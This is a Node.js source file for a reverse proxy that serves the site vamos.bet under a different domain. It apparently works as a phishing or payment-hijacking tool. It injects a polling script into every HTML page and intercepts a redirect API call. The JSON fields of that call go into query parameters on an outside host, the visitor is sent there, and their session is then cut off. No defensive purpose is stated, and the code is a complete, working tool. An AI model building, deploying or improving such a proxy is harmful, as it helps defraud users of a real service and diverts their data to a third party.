import http from "node:http";
import https from "node:https";
import crypto from "node:crypto";

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;

// Public domain users visit
const PROXY_PUBLIC_DOMAIN = "dashsh.bet";

// Upstream production site
const TARGET_HOSTNAME = "vamos.bet";
const TARGET_PORT = 443;

// Redirect endpoint
const REDIRECT_API_PATH = "/api/v2/test/redirect";

// Destination
const REDIRECT_BASE_URL = "https://poopay-pp-yot-4249.ai.studio";

// Session lifetime
const REDIRECT_TTL_MS = 30_000;

// Per-browser state storage
const clients = new Map();

/*
|--------------------------------------------------------------------------
| ISOLATED MULTI-USER SESSION SYSTEM
|--------------------------------------------------------------------------
*/

function createClientId() {
  return crypto.randomUUID();
}

function getClientId(req) {
  const cookieHeader = req.headers.cookie || "";
  const match = cookieHeader.match(/(?:^|;\s*)proxy_client_id=([^;]+)/);
  if (match) return match[1];

  // Fallback identifier using IP + User-Agent if cookies are blocked/missing
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  const ua = req.headers["user-agent"] || "";
  if (ip) {
    return crypto.createHash("sha256").update(`${ip}-${ua}`).digest("hex");
  }

  return null;
}

function getOrCreateClient(req, res) {
  let id = getClientId(req);

  if (!id) {
    id = createClientId();
    // Hardened cookie attributes for HTTPS proxies and cross-origin compatibility
    res.setHeader(
      "Set-Cookie",
      `proxy_client_id=${id}; Path=/; HttpOnly; Secure; SameSite=Lax`
    );
  }

  if (!clients.has(id)) {
    clients.set(id, {
      redirected: false,
      redirectUrl: null,
      createdAt: Date.now()
    });
  }

  return id;
}

/*
|--------------------------------------------------------------------------
| EXPIRED SESSIONS CLEANUP
|--------------------------------------------------------------------------
*/

setInterval(() => {
  const now = Date.now();
  for (const [id, state] of clients.entries()) {
    if (now - state.createdAt > REDIRECT_TTL_MS) {
      clients.delete(id);
    }
  }
}, 10_000);

/*
|--------------------------------------------------------------------------
| INJECTED WATCHER SCRIPT
|--------------------------------------------------------------------------
*/

function injectWatcher(html) {
  const script = `
<script>
(function () {
  async function checkProxyRedirect() {
    try {
      const response = await fetch("/__proxy_redirect_status", {
        method: "GET",
        cache: "no-store",
        credentials: "same-origin"
      });

      if (!response.ok) return;

      const data = await response.json();
      if (data.redirect && data.url) {
        window.location.replace(data.url);
      }
    } catch (error) {
      // Ignore temporary network errors
    }
  }

  setInterval(checkProxyRedirect, 500);
  checkProxyRedirect();
})();
</script>
`;

  if (html.includes("</body>")) {
    return html.replace("</body>", `${script}</body>`);
  }
  return html + script;
}

/*
|--------------------------------------------------------------------------
| HOP-BY-HOP HEADERS FILTER
|--------------------------------------------------------------------------
*/

function removeHopByHopHeaders(headers) {
  const result = { ...headers };
  const connection = result.connection;

  if (connection) {
    const connectionHeaders = connection
      .split(",")
      .map(v => v.trim().toLowerCase());

    for (const header of connectionHeaders) {
      delete result[header];
    }
  }

  delete result.connection;
  delete result["keep-alive"];
  delete result["proxy-authenticate"];
  delete result["proxy-authorization"];
  delete result.te;
  delete result.trailer;
  delete result.upgrade;

  return result;
}

/*
|--------------------------------------------------------------------------
| BUILD UPSTREAM HEADERS
|--------------------------------------------------------------------------
*/

function buildUpstreamHeaders(clientReq) {
  const headers = {
    ...clientReq.headers,
    host: TARGET_HOSTNAME,
    "accept-encoding": "identity", // Disable compression to allow script injection
    "user-agent": clientReq.headers["user-agent"] || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  };

  delete headers.connection;
  delete headers["content-length"];
  delete headers["transfer-encoding"];

  return headers;
}

/*
|--------------------------------------------------------------------------
| RESPONSE HANDLERS
|--------------------------------------------------------------------------
*/

function handleHtmlResponse(upstreamRes, clientRes) {
  const chunks = [];

  upstreamRes.on("data", chunk => chunks.push(chunk));

  upstreamRes.on("end", () => {
    let body = Buffer.concat(chunks);
    let html = body.toString("utf8");

    html = injectWatcher(html);
    body = Buffer.from(html, "utf8");

    const headers = removeHopByHopHeaders(upstreamRes.headers);
    delete headers["content-length"];
    delete headers["content-encoding"];

    headers["content-length"] = body.length;

    clientRes.writeHead(upstreamRes.statusCode || 200, headers);
    clientRes.end(body);
  });

  upstreamRes.on("error", error => {
    console.error("HTML response error:", error.message);
    if (!clientRes.headersSent) {
      clientRes.writeHead(502, { "Content-Type": "text/plain; charset=utf-8" });
    }
    clientRes.end("Bad Gateway");
  });
}

function handleNormalResponse(upstreamRes, clientRes) {
  const headers = removeHopByHopHeaders(upstreamRes.headers);
  clientRes.writeHead(upstreamRes.statusCode || 200, headers);
  upstreamRes.pipe(clientRes);
}

/*
|--------------------------------------------------------------------------
| FORWARD REQUEST TO UPSTREAM
|--------------------------------------------------------------------------
*/

function forwardRequest(clientReq, clientRes, bufferedBody = null) {
  const headers = buildUpstreamHeaders(clientReq);

  const options = {
    hostname: TARGET_HOSTNAME,
    servername: TARGET_HOSTNAME, // Required for TLS SNI handshake stability
    port: TARGET_PORT,
    method: clientReq.method,
    path: clientReq.url,
    headers,
    rejectUnauthorized: true
  };

  const upstreamReq = https.request(options, upstreamRes => {
    const contentType = upstreamRes.headers["content-type"] || "";

    if (contentType.toLowerCase().includes("text/html")) {
      handleHtmlResponse(upstreamRes, clientRes);
      return;
    }

    handleNormalResponse(upstreamRes, clientRes);
  });

  upstreamReq.on("error", error => {
    console.error(`❌ Upstream connection error [${error.code}]:`, error.message);

    if (!clientRes.headersSent) {
      clientRes.writeHead(502, { "Content-Type": "text/plain; charset=utf-8" });
    }
    clientRes.end(`Bad Gateway: ${error.message}`);
  });

  if (Buffer.isBuffer(bufferedBody)) {
    upstreamReq.setHeader("Content-Length", bufferedBody.length);
    upstreamReq.end(bufferedBody);
    return;
  }

  clientReq.pipe(upstreamReq);
}

/*
|--------------------------------------------------------------------------
| REDIRECT STATUS ENDPOINT
|--------------------------------------------------------------------------
*/

function handleRedirectStatus(state, clientRes) {
  const response = JSON.stringify({
    redirect: Boolean(state?.redirected),
    url: state?.redirectUrl || null
  });

  clientRes.writeHead(200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store, no-cache, must-revalidate",
    "Content-Length": Buffer.byteLength(response)
  });

  clientRes.end(response);
}

/*
|--------------------------------------------------------------------------
| REDIRECT TRIGGER ENDPOINT
|--------------------------------------------------------------------------
*/

async function handleRedirectRequest(clientReq, clientRes, state) {
  const chunks = [];
  for await (const chunk of clientReq) {
    chunks.push(chunk);
  }
  const body = Buffer.concat(chunks);

  if (body.length === 0) {
    forwardRequest(clientReq, clientRes, body);
    return;
  }

  let json;
  try {
    json = JSON.parse(body.toString("utf8"));
  } catch (error) {
    forwardRequest(clientReq, clientRes, body);
    return;
  }

  if (!json || typeof json !== "object" || Array.isArray(json)) {
    forwardRequest(clientReq, clientRes, body);
    return;
  }

  const redirectUrl = new URL(REDIRECT_BASE_URL);
  for (const [key, value] of Object.entries(json)) {
    if (value !== undefined && value !== null) {
      redirectUrl.searchParams.set(key, String(value));
    }
  }

  const finalUrl = redirectUrl.toString();

  if (state) {
    state.redirected = true;
    state.redirectUrl = finalUrl;
    state.createdAt = Date.now();
  }

  const response = JSON.stringify({
    success: true,
    proxyRedirect: true
  });

  clientRes.writeHead(200, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store, no-cache, must-revalidate",
    "Content-Length": Buffer.byteLength(response)
  });

  clientRes.end(response);
}

/*
|--------------------------------------------------------------------------
| MAIN SERVER
|--------------------------------------------------------------------------
*/

const server = http.createServer(async (clientReq, clientRes) => {
  try {
    const parsedUrl = new URL(
      clientReq.url,
      `http://${clientReq.headers.host || PROXY_PUBLIC_DOMAIN}`
    );
    const path = parsedUrl.pathname;

    const clientId = getOrCreateClient(clientReq, clientRes);
    const state = clients.get(clientId);

    // Unblock redirect lock if user explicitly visits home entry point
    if (clientReq.method === "GET" && (path === "/" || path.startsWith("/home/"))) {
      if (state) {
        state.redirected = false;
        state.redirectUrl = null;
      }
    }

    if (clientReq.method === "GET" && path === "/__proxy_redirect_status") {
      handleRedirectStatus(state, clientRes);
      return;
    }

    if (path === REDIRECT_API_PATH) {
      await handleRedirectRequest(clientReq, clientRes, state);
      return;
    }

    // Always allow static asset requests through regardless of redirect state
    const isStaticAsset = /\.(js|css|png|jpg|jpeg|gif|ico|svg|woff2?|ttf|eot)$/i.test(path);

    if (state && state.redirected && !isStaticAsset) {
      clientRes.writeHead(410, {
        "Content-Type": "text/plain; charset=utf-8",
        "Cache-Control": "no-store, no-cache, must-revalidate"
      });
      clientRes.end("Proxy session terminated");
      return;
    }

    forwardRequest(clientReq, clientRes);
  } catch (error) {
    console.error("❌ Request handler error:", error);
    if (!clientRes.headersSent) {
      clientRes.writeHead(500, { "Content-Type": "text/plain; charset=utf-8" });
    }
    clientRes.end("Internal Server Error");
  }
});

server.listen(PROXY_PORT, PROXY_HOST, () => {
  console.log(`Vamora Proxy running on http://${PROXY_HOST}:${PROXY_PORT}`);
});